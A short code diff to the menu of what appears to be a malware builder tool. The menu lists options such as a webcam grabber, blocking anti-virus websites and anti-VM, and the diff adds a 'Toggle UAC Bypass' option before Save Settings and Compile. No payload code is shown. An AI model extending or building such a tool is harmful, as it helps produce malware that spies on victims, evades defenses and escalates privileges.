@@ -93,8 +93,9 @@ class Options:
         [05] Toggle Webcam Grabber
         [06] Block Anti-Virus Websites
         [07] Toggle Anti-VM
-        [08] Save Settings
-        [09] Compile
+        [08] Toggle UAC Bypass
+        [09] Save Settings
+        [10] Compile
         '''
         self.opti = Colorate.Horizontal(Colors.blue_to_purple, self.opt, 1)
         return self.opti
